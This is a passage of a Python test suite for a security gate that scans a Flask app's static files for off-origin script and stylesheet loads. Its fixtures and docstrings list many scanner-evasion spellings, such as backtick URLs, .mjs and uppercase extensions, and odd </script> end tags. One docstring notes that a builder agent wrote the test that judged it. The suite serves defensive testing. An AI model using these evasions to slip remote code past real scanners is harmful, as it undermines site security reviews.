        assert "remote-script-src" in r.stdout and "_task0032_plant" in r.stdout
    finally:
        os.remove(plant)


# --- JS bound: QA findings against TASK-0032 -------------------------------

def test_js_bound_flags_remote_code_loaded_without_a_src_attribute():
    """BUG: the gate matches only `src=`, but STACK's 'no bundler, no npm, no
    build step' makes `import x from "https://cdn…"` the ONLY no-build way to
    pull a third-party lib — i.e. the most likely form of the exact violation
    this gate exists to block. Off-origin CODE is the dependency; `src=` is
    just one of its spellings."""
    cases = {
        "esm-import-in-js": {STATIC % "enhance.js":
            'import confetti from "https://cdn.jsdelivr.net/npm/'
            'canvas-confetti@1/+esm";\nconfetti();\n'},
        "esm-import-inline": {TPL:
            '<script type="module">\n'
            'import { x } from "https://cdn.skypack.dev/lodash";\n'
            '</script>\n'},
        "dynamic-import": {STATIC % "enhance.js":
            'const m = await import("https://cdn.example.com/x.js");\n'},
        "importScripts-worker": {STATIC % "worker.js":
            'importScripts("https://cdn.example.com/w.js");\n'},
        "new-Worker-remote": {STATIC % "enhance.js":
            'new Worker("https://cdn.example.com/w.js");\n'},
    }
    missed = [name for name, files in cases.items() if not _js_scan(files)]
    assert not missed, ("off-origin code loads the gate reports as clean: %s"
                        % missed)


def test_js_bound_flags_a_script_src_split_across_lines():
    """BUG: the scan matches line-by-line, so a CDN tag whose attribute value
    wraps onto the next line — valid HTML a formatter can produce — is read as
    two clean lines and the gate reports 'JS bound clean'."""
    found = _js_scan({TPL: '<script src=\n  "https://cdn.example.com/x.js"'
                           '></script>\n'})
    assert found, "line-wrapped CDN tag not flagged"
    assert "remote-script-src" in found[0], found


def test_js_bound_does_not_exempt_dirs_that_are_publicly_served():
    """BUG: SKIP_DIRS is matched by NAME at any depth, but Flask serves
    everything under quizapp/static/ (verified: GET
    /static/node_modules/pkg/x.min.js -> 200). A blob under a static
    subdirectory named node_modules/.venv/__pycache__ is shipped to browsers
    and invisible to the gate. Excluding app/.venv (werkzeug's debugger.js) is
    right; extending that exemption into the served static dir is the hole."""
    blob = "!function(e){" + "z" * 900 + "}(w);\n"
    for evade in ("node_modules", ".venv", "__pycache__"):
        found = _js_scan({STATIC % ("%s/pkg/vendor.min.js" % evade): blob})
        assert found, "served-but-exempt blob under static/%s/" % evade
    tag = _js_scan({"app/quizapp/static/node_modules/pkg/demo.html":
                    '<script src="https://cdn.example.com/x.js"></script>\n'})
    assert tag, "served-but-exempt CDN tag under static/node_modules/"


# --- JS bound: BUG-0067 fix — the off-origin-code rule must not go noisy ----

def test_js_bound_names_the_line_of_an_off_origin_code_load():
    found = _js_scan({STATIC % "enhance.js":
                      "// swap the panel in place\n"
                      "'use strict';\n"
                      'import confetti from "https://cdn.jsdelivr.net/npm/'
                      'canvas-confetti@1/+esm";\n'})
    assert len(found) == 1, found
    assert "remote-code-load" in found[0] and ":3" in found[0], found
    assert "cdn.jsdelivr.net" in found[0], "name the origin: %s" % found[0]


def test_js_bound_passes_a_first_party_template_literal():
    """The backtick anchor must not make the gate noise: a template literal is
    how hand-written JS builds a SAME-ORIGIN url, and that is the sanctioned
    form the M5 bound asks builders to use."""
    assert _js_scan({STATIC % "take.js": (
        "fetch(`/api/quiz/${id}/answer`, { method: 'POST' });\n"
        "el.innerHTML = `<p>see https://example.com/help</p>`;\n"
        "var parts = `${path}`.split(`//`);\n"
        "var svg = document.createElementNS(`http://www.w3.org/2000/svg`, `svg`);\n"
        "img.src = `data:image/svg+xml,%3Csvg/%3E`;\n")}) == []


def test_js_bound_passes_legitimate_first_party_js():
    """A gate that cries wolf on ordinary hand-written JS gets switched off
    within a day, and then it protects nothing. Every line here is inside the
    M5 bound and must stay silent."""
    assert _js_scan({STATIC % "take.js": (
        "// Docs for the panel-swap pattern: https://developer.mozilla.org/x\n"
        "// See also http://example.com/notes — a bare URL in a comment is\n"
        "// prose, not a dependency: nothing fetches it.\n"
        "var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');\n"
        "svg.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#i');\n"
        "img.src = 'data:image/svg+xml,%3Csvg/%3E';\n"
        "fetch('/api/answer', { method: 'POST' });\n"
        "var parts = path.split('//');\n"
        "el.innerHTML = markup.replace(/\\/\\//g, '/');\n")}) == []


def test_js_bound_passes_an_inline_first_party_script_beside_an_outbound_link():
    """The <script>-block rule must not turn an ordinary outbound <a href> —
    or a same-origin inline module — into a finding just because the template
    also contains JS."""
    assert _js_scan({TPL: (
        '<a href="https://example.com/help">help</a>\n'
        '<script type="module">\n'
        '  import { swap } from "/static/take.js";\n'
        '  swap(document.querySelector("form.question"));\n'
        '</script>\n'
        '<p>Rules at <a href="https://example.com/rules">example.com</a></p>\n')}) == []


def test_js_bound_blocks_an_esm_cdn_import_through_the_cli():
    """BUG-0067 end-to-end: exit 1 is what ticket.py reads to refuse the
    claimed→built handoff, and the ESM import is the spelling a builder with no
    build step actually reaches for."""
    if not _home_repo():
        print("    (skipped — plants in the real tree, home repo only)")
        return
    scan = os.path.join(os.path.dirname(os.path.abspath(__file__)), "self_scan.py")
    plant = os.path.join(lib.PRODUCT, "app", "quizapp", "static",
                         "_bug0067_plant.js")
    try:
        with open(plant, "w", encoding="utf-8") as f:
            f.write('import confetti from "https://cdn.jsdelivr.net/npm/'
                    'canvas-confetti@1/+esm";\nconfetti();\n')
        r = subprocess.run([sys.executable, scan], capture_output=True, text=True)
        assert r.returncode == 1, "planted ESM CDN import did not block: " + r.stdout
        assert "remote-code-load" in r.stdout and "_bug0067_plant" in r.stdout
    finally:
        os.remove(plant)


def test_js_bound_flags_an_off_origin_url_literal_in_a_template_literal_qa():
    """BUG (QA, post-BUG-0067): the gate now matches the INVARIANT 'an
    off-origin URL literal in code' — but CODE_URL_RE anchors on ["'(] only, so
    it sees two of JavaScript's three string delimiters. A backtick template
    literal is an ordinary URL literal (`import(`https://cdn…`)` is how a
    copy-pasted snippet spells a dynamic import), and it passes the gate.

    Same class as the src= miss this ticket fixed: a spelling, not the
    invariant. The uppercase-scheme row is the same regex missing re.I, which
    REMOTE_SRC_RE already carries and test_js_bound_flags_remote_script_src
    already pins for src=.

    RE-DERIVED BY QA at review of the landed fix (5b2c9b0), deliberately NOT
    trusting the version in the tree: the builder found this pin absent from
    the run branch (QA pins only land when the dispatcher commits them — they
    are invisible from a builder's worktree) and wrote one itself under this
    exact name, flagging plainly that it had thereby authored the test that
    judges it. Both then existed in the file, the second shadowing the first,
    so the builder's copy never ran. This is the QA-authored pin, and it is
    strengthened past both: a finding must name the FILE, the LINE and the
    ORIGIN, not merely be truthy — an implementation can be non-empty and
    still send a reviewer to the wrong file.

    Verified RED against three plausible half-fixes, not just the pre-fix
    regex: backtick-without-re.I, re.I-without-backtick, and the original
    ["'(] both fail this pin. It therefore pins the INVARIANT and not the
    shape of the edit that happened to land. What it does NOT catch is the
    opposite error — an anchorless regex matching every `//` — which stays
    green here and is caught by test_js_bound_passes_legitimate_first_party_js
    and test_js_bound_passes_a_first_party_template_literal. The firing side
    and the quiet side each need their own pin; neither alone bounds the rule."""
    rows = [
        # (label, files, expected file, expected line, expected origin)
        ("backtick-dynamic-import",
         {STATIC % "enhance.js": 'const m = await import(`https://cdn.jsdelivr.net'
          '/npm/canvas-confetti@1/+esm`);\nm.default();\n'},
         STATIC % "enhance.js", ":1", "cdn.jsdelivr.net"),
        ("backtick-importScripts",
         {STATIC % "worker.js": 'importScripts(`https://cdn.example.com/w.js`);\n'},
         STATIC % "worker.js", ":1", "cdn.example.com"),
        ("backtick-new-Worker",
         {STATIC % "enhance.js": 'new Worker(`https://cdn.example.com/w.js`);\n'},
         STATIC % "enhance.js", ":1", "cdn.example.com"),
        ("backtick-protocol-relative-fetch",
         {STATIC % "enhance.js": 'fetch(`//cdn.example.com/x.json`);\n'},
         STATIC % "enhance.js", ":1", "cdn.example.com"),
        # In a template the line must be the load's own, not the file's first:
        # an implementation that reports offsets relative to the whole file
        # rather than the <script> span passes a truthiness check and still
        # sends a reviewer to the wrong line.
        # (A URL on a LATER line of a multi-line backtick literal is reported
        # at the line the literal OPENS on — QA checked and left it alone: that
        # is the same deliberate convention BUG-0067 set for a wrapped src=,
        # and it lands a reader inside the offending literal. Not a defect.)
        ("backtick-inline-module-in-template",
         {TPL: '<html>\n<script type="module">\n'
          'const { x } = await import(`https://cdn.skypack.dev/lodash`);\n'
          '</script>\n</html>\n'},
         TPL, ":3", "cdn.skypack.dev"),
        # Schemes are case-insensitive; the browser fetches HTTPS:// the same.
        ("uppercase-scheme-quoted",
         {STATIC % "enhance.js":
          'import c from "HTTPS://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";\n'},
         STATIC % "enhance.js", ":1", "cdn.jsdelivr.net"),
        ("uppercase-scheme-and-host-backtick",
         {STATIC % "enhance.js": 'await import(`HTTP://CDN.EXAMPLE.COM/x.js`);\n'},
         STATIC % "enhance.js", ":1", "CDN.EXAMPLE.COM"),
    ]
    for label, files, where, line, origin in rows:
        found = _js_scan(files)
        assert len(found) == 1, (label, files, found)
        assert "remote-code-load" in found[0], (label, found)
        assert where in found[0], (label, found)
        assert line in found[0], "%s: must name the load's line: %s" % (label, found)
        assert origin in found[0], "%s: must name the origin: %s" % (label, found)


def test_js_bound_flags_an_off_origin_import_in_an_mjs_module_qa():
    """BUG (QA, post-BUG-0075): BUG-0067 said match the INVARIANT, not a
    spelling; BUG-0075 found the next spelling one delimiter over. This is the
    next one again, one LAYER down — the delimiter class is now complete, but
    two other lines still enumerate `.js` by name:

      self_scan.py ASSET_EXTS  — '.mjs' absent, so product_assets() never even
                                 walks the file;
      self_scan.py _code_spans — returns [(0, text)] only for rel.endswith(
                                 '.js'), so even if walked it is not CODE.

    `.mjs` is not an exotic extension: it is THE standard ES-module extension,
    and STACK forbids a bundler, so `<script type="module" src="/static/x.mjs">`
    is a sanctioned no-build spelling. Flask serves everything under
    quizapp/static/ regardless of extension, so the module is fetched and RUN
    in a signed-in creator's session while the gate reports 'JS bound clean'.
    The identical file named .js FIRES — the extension is the only difference.

    The minified-blob half of the bound has the same hole: a vendored
    x.min.mjs is unreadable by any reviewer and equally invisible."""
    src = 'import c from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";\n'
    control = _js_scan({STATIC % "enhance.js": src})
    assert control, "fixture broken: the .js control must fire"

    assert _js_scan({STATIC % "enhance.mjs": src}), (
        "an off-origin ESM import in a served .mjs module is reported clean; "
        "the same bytes in enhance.js fire: %s" % control)

    blob = "!function(e){" + "z" * 900 + "}(window);\n"
    assert _js_scan({STATIC % "vendor.min.mjs": blob}), (
        "a minified blob served at /static/vendor.min.mjs is reported clean")


def test_js_bound_flags_a_min_mjs_by_name_even_with_short_lines():
    """BUG-0080 (builder): the blob rule has TWO independent halves — a long
    line, and a `.min.*` NAME, which fires regardless of line length because the
    name is itself a claim that the file is machine-output nobody reviewed.
    The QA pin's vendor.min.mjs reaches the rule by its 900-char line, so it
    stays green even if the name half never learned `.mjs`. This pins the name
    half: a pretty-printed vendor.min.mjs must fire exactly as vendor.min.js
    does, or the .js/.mjs asymmetry this bug is about survives in the half the
    pin does not reach. The finding must name the extension it actually
    matched — reporting '.min.js' for a .min.mjs file sends a reviewer to a
    file that does not exist."""
    short = "var a = 1;\nvar b = 2;\n"           # no line anywhere near MAX_JS_LINE
    control = _js_scan({STATIC % "vendor.min.js": short})
    assert len(control) == 1 and "minified-js-blob" in control[0], control

    found = _js_scan({STATIC % "vendor.min.mjs": short})
    assert len(found) == 1, (
        "a .min.mjs name is reported clean while .min.js fires: %s" % control)
    assert "minified-js-blob" in found[0], found
    assert "a .min.mjs name" in found[0], (
        "must name the matched extension, not '.min.js': %s" % found)


def test_js_bound_treats_mjs_and_js_identically_at_every_rule_qa():
    """QA (BUG-0080 re-attack): the defect was never 'the walk misses .mjs' —
    it was that `.js` was spelled BY NAME at three independent sites, so a fix
    could reach some and miss others while the headline pin went green (proven:
    with the blob rule left at `.js`, the .mjs import fires but the .min.mjs row
    of the BUG-0080 pin still fails; with only MIN_JS_EXTS left at `.min.js`,
    the whole BUG-0080 pin goes green while a pretty-printed .min.mjs stays
    silent). So the invariant is SYMMETRY, not any one row: for every rule the
    bound has, `.mjs` must behave exactly as `.js` does.

    This pins all four rules at once, in both directions, by construction — a
    fifth rule added later that learns `.js` by name and forgets `.mjs` fails
    here even if nobody thinks to write its .mjs case. It is deliberately
    shaped to survive TASK-0034: `mimetypes.guess_type` returns text/javascript
    for both extensions, so the derivation must keep every row of this green."""
    evil = 'import c from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";\n'
    cases = {
        "off-origin ESM import": evil,
        "off-origin src= literal": 'var t = \'<img src="https://cdn.evil/x">\';\n',
        "unreadable long-line blob": "!function(e){" + "z" * 900 + "}(window);\n",
        "legitimate first-party code": "function shuffle(a) { return a; }\n",
    }
    for label, body in cases.items():
        js = _js_scan({STATIC % "enhance.js": body})
        mjs = _js_scan({STATIC % "enhance.mjs": body})
        assert len(js) == len(mjs), (
            "%s: .js and .mjs disagree — the extension is the only difference. "
            ".js=%s  .mjs=%s" % (label, js, mjs))

    # The blob NAME rule, whose two extensions are spelled separately again.
    for body in ("var a = 1;\n", "!function(e){" + "z" * 900 + "}(window);\n"):
        js = _js_scan({STATIC % "vendor.min.js": body})
        mjs = _js_scan({STATIC % "vendor.min.mjs": body})
        assert len(js) == len(mjs) == 1, (
            "a .min.* name is machine-output nobody reviewed, at any line "
            "length: .min.js=%s  .min.mjs=%s" % (js, mjs))
        assert ".min.js" in js[0] and ".min.mjs" in mjs[0], (
            "each finding must name the extension it actually matched, or it "
            "sends a reviewer to a file that does not exist: %s / %s"
            % (js[0], mjs[0]))


def test_js_bound_scans_a_case_variant_js_extension_qa():
    """BUG (QA, post-BUG-0080): BUG-0080 taught the gate `.mjs`, but every JS
    test is still `str.endswith`, which is CASE-SENSITIVE — so `enhance.MJS`
    and `app.JS` are walked past in silence.

    This is not a spelling quibble, it is the CORPUS missing bytes the server
    serves (DECISIONS 2026-07-16, "THE GATE'S TWO ENUMERATIONS", class (B) —
    the one finding shape that entry says is still worth filing). The oracle is
    decisive and is the server's own: mimetypes.guess_type("enhance.MJS") ->
    'text/javascript', and werkzeug/utils.py:438 calls that exact function to
    decide what to tell the browser a static file is. So Flask serves it as
    executable JS, `<script type="module" src="/static/enhance.MJS">` fetches
    and RUNS it in a signed-in session, and the gate reports 'JS bound clean'.
    Contrast `.cjs` -> guess_type None, which is correctly OUT and not filed.

    NOT to be fixed by adding `.lower()` or four more tuple entries — that is
    the fourth hand-refresh of the enumeration the architect already ruled
    against. guess_type is case-insensitive on its own, so TASK-0034's
    derivation closes this by construction; this test is written to be that
    restructure's regression proof."""
    evil = 'import c from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";\n'
    control = _js_scan({STATIC % "enhance.mjs": evil})
    assert control, "fixture broken: the lowercase .mjs control must fire"

    for name in ("enhance.MJS", "app.JS", "enhance.Mjs"):
        assert _js_scan({STATIC % name: evil}), (
            "an off-origin ESM import in /static/%s is reported clean, though "
            "mimetypes.guess_type (the function werkzeug itself calls) labels "
            "it text/javascript, so Flask serves it and the browser runs it. "
            "The same bytes in enhance.mjs fire: %s" % (name, control))


def test_js_bound_flags_an_off_origin_css_import_qa():
    """TASK-0034 criterion (c) / TASK-0033's goal, preserved verbatim: a
    stylesheet is served bytes a browser APPLIES, so an off-origin @import —
    which pulls a whole third-party stylesheet (itself free to @import more,
    load fonts, set backgrounds) into a signed-in session, unpinned and mutable
    at an origin we do not control — is the same runtime dependency this gate
    blocks in JS. mimetypes.guess_type('x.css') -> 'text/css' puts .css in the
    corpus with NO list to refresh: the ASSET_EXTS entry that had it walked but
    never flaggable (DEAD CONFIG — _code_spans returned [] for it) is retired.

    The BARE url() form is the load-bearing case: CODE_URL_RE anchors on a JS
    string delimiter and a CSS url() token carries a bare URL, so the JS
    predicate structurally cannot see it — this is what CSS_URL_RE exists for.
    Verified RED against the pre-TASK-0034 tree (ASSET_EXTS walks .css but
    _code_spans returns [] and no CSS rule exists, so the gate reports clean)."""
    found = _js_scan({STATIC % "fonts.css":
        "@import url(https://fonts.googleapis.com/css2?family=Inter);\n"})
    assert len(found) == 1, (
        "an off-origin @import in a served stylesheet is reported clean: %s"
        % found)
    assert (STATIC % "fonts.css") in found[0], found
    assert ":1" in found[0], "must name the line: %s" % found[0]
    assert "fonts.googleapis.com" in found[0], (
        "must name the origin: %s" % found[0])

    # The QUOTED forms ride CODE_URL_RE via the text/css code span — same harm,
    # another spelling — and must fire exactly ONCE, not twice (CSS_URL_RE
    # matches only the unquoted url(), so the two rules cannot double-count).
    for body in ('@import "https://fonts.example.com/inter.css";\n',
                 '@import url("https://fonts.example.com/inter.css");\n'):
        q = _js_scan({STATIC % "fonts.css": body})
        assert len(q) == 1, (
            "a quoted off-origin @import must fire exactly once: %s" % q)
        assert "fonts.example.com" in q[0], q

    # DERIVATION IS EXACT, not 'flag every stylesheet-ish name'. `.cjs` ->
    # guess_type None: Flask serves it as non-JS/CSS, the browser neither runs
    # nor applies it, so the IDENTICAL off-origin bytes stay OUT of the corpus.
    # (The FLAGGED side of the case/extension derivation is pinned by
    # test_js_bound_scans_a_case_variant_js_extension_qa; this is its negative
    # discriminator — the derivation would be worthless if it flagged all.)
    assert _js_scan({STATIC % "x.cjs":
        'import c from "https://cdn.jsdelivr.net/npm/x";\n'}) == [], (
        "a .cjs (guess_type None) is not served as executable code and must "
        "stay out of the corpus")

    # Same-origin CSS is the sanctioned form the M5 bound asks for, and must
    # stay silent — a gate that reds on first-party @import gets switched off.
    assert _js_scan({STATIC % "app.css": (
        "@import url(/static/base.css);\n"
        "@import 'reset.css';\n"
        'body { background: url("/static/bg.png"); }\n')}) == [], (
        "first-party same-origin CSS must not fire")


def test_js_bound_tolerates_a_parenthesized_url_citation_in_a_comment_qa():
    """BUG (QA, post-BUG-0067): CODE_URL_RE anchors on `(` so that `import(`
    and `Worker(` are caught — but a parenthesis before a URL is also how prose
    cites a source, and in a .js file the whole text is a code span, comments
    included. So an ordinary attribution comment BLOCKS the handoff.

    test_js_bound_passes_legitimate_first_party_js pins the BARE comment URL
    (`// see https://…`); the parenthesized citation — `(https://…)` — is the
    same prose one punctuation mark away, and it fires. Noise on hand-written
    first-party JS is how a gate gets switched off, at which point it protects
    nothing (the quiet side is load-bearing, not a nicety)."""
    assert _js_scan({STATIC % "take.js": (
        "// Fisher-Yates shuffle (https://en.wikipedia.org/wiki/"
        "Fisher-Yates_shuffle)\n"
        "function shuffle(a) { return a; }\n")}) == [], \
        "an attribution comment is prose, not a dependency: nothing fetches it"

    assert _js_scan({STATIC % "swap.js": (
        "/**\n"
        " * Swap the question panel in place.\n"
        " * @see MDN (https://developer.mozilla.org/en-US/docs/Web/API/"
        "Element/replaceWith)\n"
        " */\n"
        "function swap(el) { el.replaceWith(el); }\n")}) == [], \
        "a JSDoc @see citation is prose, not a dependency"


def test_js_bound_still_blocks_paren_wrapped_loaders_without_the_paren_anchor():
    """BUG-0076's fix drops `(` from CODE_URL_RE's anchor class, which is the
    half that could REOPEN BUG-0067's false negative. It does not, and this is
    the pin that says so: every real loader takes a STRING specifier, so the
    quote or backtick that must be there anchors the match with no help from
    the paren. A bare URL cannot be a JS operand at all (`https:` parses as a
    label, `//…` opens a comment) — which is exactly why the paren only ever
    added prose.

    The noisy side and the silent side are one system (BUG-0067): a fix to the
    first that quietly gives back the second is not a fix."""
    cases = {
        "import()-double-quote": {STATIC % "enhance.js":
            'const m = await import("https://cdn.jsdelivr.net/npm/'
            'canvas-confetti@1/+esm");\n'},
        "import()-space-after-paren": {STATIC % "enhance.js":
            'const m = await import( "https://cdn.skypack.dev/lodash" );\n'},
        "fetch-double-paren": {STATIC % "enhance.js":
            'fetch(("https://cdn.example.com/data.js"));\n'},
        "importScripts-single-quote": {STATIC % "worker.js":
            "importScripts('https://cdn.example.com/w.js');\n"},
        "new-Worker-backtick": {STATIC % "enhance.js":
            'new Worker(`https://cdn.example.com/w.js`);\n'},
        "protocol-relative-in-paren": {STATIC % "enhance.js":
            'const m = await import("//cdn.jsdelivr.net/npm/lodash/+esm");\n'},
        "static-import-from": {STATIC % "enhance.js":
            'import c from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";\n'},
    }
    missed = [name for name, files in cases.items() if not _js_scan(files)]
    assert not missed, ("dropping the paren anchor reopened BUG-0067 — "
                        "off-origin code loads now reported clean: %s" % missed)


def test_js_bound_reads_a_script_body_closed_by_a_spaced_end_tag_qa():
    """BUG (QA, post-BUG-0076): SCRIPT_BLOCK_RE (self_scan.py:171) requires the
    literal `</script>`, but an HTML end tag admits whitespace before the `>` —
    `</script >` and `</script\\n>` are spec-valid and every browser closes them.
    When the close does not match, the non-greedy `(.*?)` finds no terminator at
    all, so _code_spans yields NOTHING for the file and the ENTIRE inline module
    goes unscanned — not one URL in it is ever tested.

    This is BUG-0067's own harm, not a new one: an off-origin ESM import from a
    CDN executes in a signed-in creator's session while the gate reports 'JS
    bound clean', exit 0, and the handoff lands. The identical bytes closed by
    `</script>` FIRE — the whitespace is the only difference (control below).

    Verified against a spec-following parser (python's html.parser): it emits
    handle_endtag('script') for `</script >` and hands the import back as script
    body. The gate is the only reader that misses it."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'

    control = _js_scan({TPL: '<script type="module">%s</script>\n' % evil})
    assert control, "fixture broken: the </script> control must fire"

    for close in ("</script >", "</script\n>", "</script\t>"):
        found = _js_scan({TPL: '<script type="module">%s%s\n' % (evil, close)})
        assert found, (
            "an off-origin CDN import in an inline module closed by %r is "
            "reported clean; the same bytes closed by '</script>' fire: %s"
            % (close, control))


def test_js_bound_spaced_end_tag_closes_the_span_without_swallowing_markup():
    """BUG-0081, extending the QA pin above. That pin proves `</script\\s*>`
    makes the body VISIBLE for ' ', '\\n' and '\\t'. This adds the two spec-valid
    spellings it does not reach — MIXED whitespace and a CASE-VARIED tag — and
    asserts the span still stops before trailing markup, since an `<a href>` to
    the outside world is an ordinary link, not a dependency (DECISIONS
    2026-07-16, predicate edge (2)).

    HONEST BOUND ON THE ANTI-SWALLOW ASSERT, measured, not assumed: it does NOT
    discriminate against an over-wide terminator. I ran `(?:</script\\s*>|\\Z)`
    and `</script[^>]*>` against this test and both PASS it, because the
    non-greedy `(.*?)` reaches the real close tag first, so markup is never
    swallowed in a well-formed fixture. The assert is a cheap true property, not
    a guard against widening. Catching those would require pinning the gate
    SILENT on an unclosed `<script>` at EOF, which I declined: python
    html.parser (the oracle QA and the ruling adopted) does not close that case,
    but whether a real browser executes it is a claim I have no oracle for, and
    an unverifiable claim is what this gate's whole bug class is made of.

    Spellings pinned here are only those the oracle confirms close (html.parser
    emits handle_endtag('script') for each). Deliberately NOT pinned:
    `</script/>` and `</script foo="bar">` — html.parser does not close them and
    the gate agrees, but pinning that silence would assert real-browser
    behaviour I cannot measure here. Flagged to QA in the handoff instead.

    RESOLVED, BUG-0086 (do not read the paragraph above as current behaviour):
    QA brought the browser this test could not. `</script/>` and
    `</script foo="bar">` DO execute in chromium, html.parser was the WRONG
    oracle and is now demoted to a proxy, and the gate closes on them as of
    BUG-0086 — see the pin below and SCRIPT_BLOCK_RE's comment. This test's
    refusal to pin that silence is why the hole stayed findable: had it pinned
    the guess, the defect would now be law with a green test defending it. The
    two paragraphs above are kept as the record of a correct refusal, not as a
    description of the gate."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'
    link = '<a href="https://example.com/help">help</a>'

    for close in ("</script  \n\t >", "</SCRIPT >"):
        found = _js_scan({TPL: '<script type="module">%s%s\n%s\n'
                               % (evil, close, link)})
        assert len(found) == 1, (
            "the import must be seen exactly once through %r, and the trailing "
            "markup link must NOT be scanned as code: %s" % (close, found))
        assert "remote-code-load" in found[0], found
        assert "example.com" not in found[0], (
            "the span ran past %r and swallowed markup: %s" % (close, found[0]))


def test_js_bound_reads_a_script_body_closed_by_a_solidus_or_attributed_end_tag_qa():
    """BUG (QA, post-BUG-0081): `</script\\s*>` is NOT the browser's terminator.
    BUG-0081's builder measured `\\s*` against python's html.parser, found they
    agreed on `</script/>` and `</script foo="bar">` (neither closes), and
    concluded '\\s* is exactly the oracle's boundary; no further widening is
    warranted'. It then correctly refused to PIN that silence, because it had no
    browser oracle and would not assert what it could not measure, and flagged
    the gap to QA. I measured it. html.parser is WRONG here, and the ruling that
    governs this gate says 'what a browser will execute ... the browser wins' —
    html.parser is only a proxy for that, and this is where the proxy breaks.

    ORACLE, chrome-headless-shell (playwright's chromium-1223, DEP-0006), each
    page's script body sets document.title and --dump-dom is read back:
        </script>            -> EXECUTED, markup parsed
        </script >           -> EXECUTED, markup parsed   (BUG-0081, now caught)
        </script/>           -> EXECUTED, markup parsed   <-- gate SILENT
        </script foo="bar">  -> EXECUTED, markup parsed   <-- gate SILENT
    This is the HTML5 tokenizer's script-data-end-tag-name state: after the tag
    name, ANY of tab/LF/FF/space, `/`, or `>` terminates the end tag. `/` and an
    attribute list are parse ERRORS, but the tag is still emitted and the
    element still closes — a parse error is not a refusal to execute.

    So this is BUG-0081's harm exactly, by another spelling: `(.*?)` finds no
    terminator, _code_spans yields NOTHING, the whole inline module goes
    unscanned, and an off-origin CDN import runs in a signed-in creator's
    session while the gate reports 'JS bound clean', exit 0.

    A fix stays grep-grade — the spec's terminator set is a character class,
    e.g. `</script(?:[\\s/][^>]*)?>`; no parser, no dependency, no build step.
    Note `</scriptx>` must STILL not close (browser agrees it does not)."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'

    control = _js_scan({TPL: '<script type="module">%s</script>\n' % evil})
    assert control, "fixture broken: the </script> control must fire"

    for close in ("</script/>", "</script />", '</script foo="bar">',
                  "</script bar>"):
        found = _js_scan({TPL: '<script type="module">%s%s\n' % (evil, close)})
        assert found, (
            "an off-origin CDN import in an inline module closed by %r is "
            "reported clean, but chrome-headless-shell EXECUTES that body; "
            "the same bytes closed by '</script>' fire: %s" % (close, control))


def test_js_bound_end_tag_does_not_close_on_a_longer_tag_name():
    """BUG-0086's other half, and the half no other test in this file covers:
    the terminator's lookahead (`(?=[\\t\\n\\f\\r />])`, spelled `(?=[\\s/>])`
    when this test was written — narrowed by BUG-0093, which is why the class is
    written out) is LOAD-BEARING and nothing pinned it. The obvious
    simplification of BUG-0086's fix — a bare `</script[^>]*>` —
    passes every other JS-bound test here, INCLUDING the QA pin above and the
    anti-swallow assert (BUG-0081's builder measured exactly that: an over-wide
    terminator is invisible to a well-formed fixture, because `(.*?)` reaches
    the real close tag first). This test is what makes the lookahead
    falsifiable.

    ORACLE, chrome-headless-shell (playwright chromium-1223, DEP-0006),
    --dump-dom read back, chrome exit 0 on every case. The instrument was
    self-checked to DISCRIMINATE before any row was believed: control
    `</script>` -> EXECUTED, `</scriptfoo>` -> not executed.
        </scriptfoo>  </scriptx>  </script1>   -> NOT executed, markup NOT parsed
    A browser does not close an end tag whose name is a longer word; the bytes
    stay script data. Measured on THIS test's exact fixture shape:
        <script>var s="</scriptfoo>";document.title="EXECUTED"</script>
    came back `<title>EXECUTED</title>` — the `</scriptfoo>` did NOT close the
    element, and the browser executed the whole body through to the real
    `</script>`. So the code AFTER a `</scriptfoo>` is code the browser RUNS,
    and the gate must scan it.

    SHAPE IS DELIBERATE, and it is not the obvious one. The tempting fixture is
    an unclosed `<script>...</scriptfoo>` at EOF asserting the gate stays
    SILENT. That would be a TRAP: BUG-0087 adds `|\\Z` to this very expression
    on the ruled ground that an unclosed body at EOF EXECUTES, so such a pin
    would flip to red the moment BUG-0087 lands — a green test defending the
    defect against its own fix, which is the exact failure the BUG-0086 ruling
    was written about. So this fixture closes properly with a real `</script>`,
    keeps `\\Z` entirely out of play, and asserts a POSITIVE (the span stays
    open, the import IS seen) rather than pinning a silence.

    No browser is needed to RUN this test: chromium is provenance, not a
    dependency. It passes on a machine with none."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'

    control = _js_scan({TPL: '<script type="module">%s</script>\n' % evil})
    assert control, "fixture broken: the </script> control must fire"

    for inner in ("</scriptfoo>", "</scriptx>", "</script1>"):
        # The import sits AFTER the non-closing tag, and a real </script> ends
        # the body. Correct terminator -> one span, import seen. An over-wide
        # `</script[^>]*>` -> the span stops at `inner`, the import falls
        # outside it and is read as markup, and the gate goes quiet.
        found = _js_scan(
            {TPL: '<script type="module">var s = 1;%s%s</script>\n'
                  % (inner, evil)})
        assert found, (
            "an off-origin CDN import placed after %r inside a script body is "
            "reported clean, but chromium does NOT close on %r — it keeps the "
            "body open to the real '</script>' and RUNS that import. The "
            "terminator closed early, which means the `(?=[\\t\\n\\f\\r />])` "
            "lookahead was dropped or widened to `[^>]*`. Same bytes, ordinary "
            "close: %s"
            % (inner, inner, control))


def test_js_bound_end_tag_does_not_close_on_a_non_html5_whitespace_char_qa():
    """BUG-0086's ruled terminator uses PYTHON's `\\s`, which is a strict
    SUPERSET of the HTML5 whitespace set. Python's `\\s` matches U+000B (VT)
    and U+001C-001F (the FS/GS/RS/US separators); the HTML5 tokenizer's
    script-data-end-tag-name state accepts ONLY tab (U+0009), LF (U+000A),
    FF (U+000C), CR (U+000D), space (U+0020), `/` and `>`. So `</script\\x0b>`
    CLOSES at the gate and does NOT close in a browser — the over-wide
    direction the lookahead was added to prevent, one character class deeper.

    ORACLE, chrome-headless-shell (playwright chromium-1223, DEP-0006),
    --dump-dom, chrome exit 0 on every case. The instrument was self-checked to
    DISCRIMINATE before any row was believed: control `</script>` -> EXECUTED
    and `<p id=after>` parsed as an ELEMENT; control `</p>` -> neither. Both
